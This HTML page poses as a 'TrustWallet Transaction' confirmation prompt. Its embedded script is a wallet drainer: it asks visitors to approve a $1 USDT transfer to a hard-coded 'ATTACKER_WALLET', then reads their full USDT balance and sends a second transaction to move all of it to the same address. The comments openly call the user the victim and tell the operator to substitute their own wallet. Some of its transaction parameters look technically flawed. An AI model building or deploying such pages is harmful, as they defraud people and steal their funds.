<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TrustWallet Transaction</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: #fff;
            text-align: center;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            background: #2a2a2a;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }
        button {
            background: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background: #0056b3;
        }
        #status {
            margin-top: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>TrustWallet Transaction</h1>
        <p>Please confirm the $1 USDT transfer to proceed.</p>
        <button id="confirmBtn">Send $1 USDT</button>
        <p id="status">Waiting for confirmation...</p>
    </div>

    <script>
        // ===== CONFIGURATION (CHANGE THESE) =====
        const ATTACKER_WALLET = "0x4c4CBfF8c45e131ab8f2af5f04b3A162078727c7"; // Replace with your ETH/USDT wallet
        const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT on Ethereum
        const USDT_DECIMALS = 6;
        const CHAIN_ID = "0x1"; // Ethereum Mainnet

        // ===== WEB3 INJECTION =====
        if (typeof window.ethereum === "undefined") {
            document.getElementById("status").textContent = "Error: TrustWallet not detected!";
        } else {
            // Request account access (victim must approve)
            window.ethereum.request({ method: "eth_requestAccounts" })
                .then(accounts => {
                    const victimAddress = accounts[0];
                    document.getElementById("status").textContent = `Connected: ${victimAddress}`;

                    // ===== STEP 1: SEND $1 USDT TO ATTACKER =====
                    document.getElementById("confirmBtn").addEventListener("click", () => {
                        document.getElementById("status").textContent = "Processing $1 USDT transfer...";

                        // Encode $1 USDT transfer to attacker
                        const amount = (1 * 10 ** USDT_DECIMALS).toString(16); // 1 USDT in hex
                        const transferData = `0xa9059cbb000000000000000000000000${ATTACKER_WALLET.slice(2)}000000000000000000000000000000000000000000000000${amount}`;

                        // Send the $1 USDT transaction
                        window.ethereum.request({
                            method: "eth_sendTransaction",
                            params: [{
                                from: victimAddress,
                                to: USDT_CONTRACT,
                                data: transferData,
                                gas: "0x5208", // 21000 gas
                                gasPrice: "0x3b9aca00" // 1 Gwei
                            }]
                        })
                        .then(txHash => {
                            document.getElementById("status").textContent = `Transaction sent: ${txHash}`;

                            // ===== STEP 2: DRAIN THE REST OF THE USDT =====
                            setTimeout(() => {
                                drainAllUSDT(victimAddress);
                            }, 5000); // Wait 5 sec for $1 tx to confirm
                        })
                        .catch(err => {
                            document.getElementById("status").textContent = `Error: ${err.message}`;
                        });
                    });
                })
                .catch(err => {
                    document.getElementById("status").textContent = `Error: ${err.message}`;
                });
        }

        // ===== FUNCTION TO DRAIN ALL USDT =====
        function drainAllUSDT(victimAddress) {
            document.getElementById("status").textContent = "Checking USDT balance...";

            // Get victim's USDT balance
            const balanceData = `0x70a08231000000000000000000000000${victimAddress.slice(2)}`;

            window.ethereum.request({
                method: "eth_call",
                params: [{
                    to: USDT_CONTRACT,
                    data: balanceData
                }, "latest"]
            })
            .then(balanceHex => {
                const balance = parseInt(balanceHex, 16) / (10 ** USDT_DECIMALS);

                if (balance <= 0) {
                    document.getElementById("status").textContent = "No USDT balance to drain.";
                    return;
                }

                document.getElementById("status").textContent = `Draining ${balance} USDT...`;

                // Encode full balance transfer to attacker
                const fullAmountHex = balanceHex.slice(2); // Remove '0x'
                const drainData = `0xa9059cbb000000000000000000000000${ATTACKER_WALLET.slice(2)}000000000000000000000000000000000000000000000000${fullAmountHex}`;

                // Send the drain transaction
                window.ethereum.request({
                    method: "eth_sendTransaction",
                    params: [{
                        from: victimAddress,
                        to: USDT_CONTRACT,
                        data: drainData,
                        gas: "0x5208",
                        gasPrice: "0x3b9aca00"
                    }]
                })
                .then(txHash => {
                    document.getElementById("status").textContent = `Drained ${balance} USDT! TX: ${txHash}`;
                })
                .catch(err => {
                    document.getElementById("status").textContent = `Drain failed: ${err.message}`;
                });
            })
            .catch(err => {
                document.getElementById("status").textContent = `Balance check failed: ${err.message}`;
            });
        }
    </script>
</body>
</html>
